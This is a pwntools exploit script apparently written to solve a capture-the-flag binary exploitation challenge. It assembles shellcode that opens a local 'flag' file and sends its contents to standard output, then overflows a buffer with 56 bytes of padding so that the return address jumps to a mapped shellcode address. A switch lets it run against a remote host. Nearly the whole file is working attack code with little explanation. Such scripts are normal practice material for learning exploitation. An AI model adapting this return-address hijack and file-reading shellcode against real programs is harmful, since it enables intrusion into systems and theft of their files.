from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './challenge/binary-exploitation-hijack-to-mmap-shellcode-w'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# offset = find_offset(exe, cyclic(500))

shell_addr = 0x21f2b000
shellcode = """
    mov rax, 2
    lea rdi, [rip+flag]
    mov rsi, 0
    syscall

    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 1000
    mov rax, 40
    syscall

    flag:
    .string "./flag"
"""
shellcode = asm(shellcode)
io = start()
io.sendline(shellcode)

payload = flat([
    b"A"*56,
    shell_addr
])
io.sendline()
io.sendlineafter(b'', payload)
# io.recvuntil(b'')

io.interactive()
